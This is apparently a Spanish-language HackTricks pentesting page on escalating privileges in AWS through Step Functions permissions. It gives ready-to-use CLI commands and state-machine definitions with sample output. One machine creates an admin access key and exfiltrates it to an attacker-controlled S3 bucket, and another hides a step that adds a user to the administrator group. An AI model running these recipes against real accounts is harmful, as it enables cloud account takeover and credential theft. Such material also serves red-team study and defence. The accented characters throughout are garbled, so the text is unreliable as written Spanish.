# AWS - Escalada de privilegios en Step Functions

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n [**art칤culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Step Functions

Para obtener m치s informaci칩n sobre este servicio de AWS, consulta:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Un atacante con los permisos **`states:TestState`** & **`iam:PassRole`** puede probar cualquier estado y asignar cualquier rol de IAM a 칠l sin crear ni actualizar una m치quina de estados existente, lo que permite el acceso no autorizado a otros servicios de AWS con los permisos de los roles. Potencialmente, estos permisos combinados pueden llevar a acciones no autorizadas extensas, desde manipulaci칩n de flujos de trabajo para alterar datos hasta filtraciones de datos, manipulaci칩n de recursos y escalada de privilegios.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Los siguientes ejemplos muestran c칩mo probar un estado que crea una clave de acceso para el usuario **`admin`** aprovechando estos permisos y un rol permisivo del entorno de AWS. Este rol permisivo deber칤a tener asociada alguna pol칤tica de alto privilegio (por ejemplo **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permita al estado realizar la acci칩n **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Comando** ejecutado para realizar el privesc:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Impacto Potencial**: Ejecuci칩n y manipulaci칩n no autorizadas de flujos de trabajo y acceso a recursos sensibles, lo que podr칤a provocar brechas de seguridad significativas.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Un atacante con los permisos **`states:CreateStateMachine`** y **`iam:PassRole`** podr칤a crear una m치quina de estados y asignarle cualquier rol de IAM, lo que habilitar칤a el acceso no autorizado a otros servicios de AWS con los permisos de ese rol. A diferencia de la t칠cnica de escalada de privilegios anterior (**`states:TestState`** & **`iam:PassRole`**), esta no se ejecuta por s칤 sola, tambi칠n necesitar치s tener los permisos **`states:StartExecution`** o **`states:StartSyncExecution`** (**`states:StartSyncExecution`** no est치 disponible para flujos de trabajo est치ndar, solo para expresar m치quinas de estados) para iniciar y ejecutar sobre la m치quina de estados.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Los siguientes ejemplos muestran c칩mo crear una m치quina de estados que cree una clave de acceso para el usuario **`admin`** y exfiltra esta clave de acceso a un bucket de S3 controlado por un atacante, aprovechando estos permisos y un rol permisivo del entorno de AWS. Este rol permisivo deber칤a tener asociada alguna pol칤tica de alto privilegio (por ejemplo **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permita a la m치quina de estados realizar las acciones **`iam:CreateAccessKey`** y **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Comando** ejecutado para **crear la m치quina de estados**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Comando** ejecutado para **iniciar una ejecuci칩n** de la m치quina de estados previamente creada:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

El bucket de S3 controlado por el atacante debe tener permisos para aceptar una acci칩n s3:PutObject de la cuenta de la v칤ctima.

{% endhint %}

- **Impacto potencial**: Ejecuci칩n no autorizada y manipulaci칩n de flujos de trabajo y acceso a recursos sensibles, lo que podr칤a resultar en brechas de seguridad significativas.

### `states:UpdateStateMachine` & (no siempre requerido) `iam:PassRole`

Un atacante con el permiso **`states:UpdateStateMachine`** podr칤a modificar la definici칩n de una m치quina de estados, pudiendo agregar estados sigilosos adicionales que podr칤an resultar en una escalada de privilegios. De esta manera, cuando un usuario leg칤timo inicie una ejecuci칩n de la m치quina de estados, este nuevo estado sigiloso malicioso se ejecutar치 y la escalada de privilegios ser치 exitosa.

Dependiendo de lo permisivo que sea el Rol IAM asociado a la m치quina de estados, un atacante se enfrentar칤a a 2 situaciones:

1. **Rol IAM permisivo**: Si el Rol IAM asociado a la m치quina de estados ya es permisivo (por ejemplo, tiene la pol칤tica **`arn:aws:iam::aws:policy/AdministratorAccess`** adjunta), entonces el permiso **`iam:PassRole`** no ser칤a necesario para escalar privilegios, ya que no ser칤a necesario actualizar tambi칠n el Rol IAM, con la definici칩n de la m치quina de estados es suficiente.
2. **Rol IAM no permisivo**: En contraste con el caso anterior, aqu칤 un atacante tambi칠n requerir칤a el permiso **`iam:PassRole`** ya que ser칤a necesario asociar un Rol IAM permisivo a la m치quina de estados adem치s de modificar la definici칩n de la m치quina de estados.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Los siguientes ejemplos muestran c칩mo actualizar una m치quina de estados leg칤tima que simplemente invoca una funci칩n Lambda de HelloWorld, para agregar un estado adicional que a침ade el usuario **`unprivilegedUser`** al Grupo IAM **`administrator`**. De esta manera, cuando un usuario leg칤timo inicie una ejecuci칩n de la m치quina de estados actualizada, este nuevo estado malicioso se ejecutar치 y la escalada de privilegios ser치 exitosa.

{% hint style="warning" %}

Si la m치quina de estados no tiene un Rol IAM permisivo asociado, tambi칠n se requerir칤a el permiso **`iam:PassRole`** para actualizar el Rol IAM con el fin de asociar un Rol IAM permisivo (por ejemplo, uno con la pol칤tica **`arn:aws:iam::aws:policy/AdministratorAccess`** adjunta).

{% endhint %}

{% tabs %}

{% tab title="M치quina de Estados Leg칤tima" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="M치quina de Estado Actualizada Maliciosa" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Comando** ejecutado para **actualizar** **la m치quina de estados leg칤tima**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Impacto Potencial**: Ejecuci칩n y manipulaci칩n no autorizadas de flujos de trabajo y acceso a recursos sensibles, lo que podr칤a provocar brechas de seguridad significativas.

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
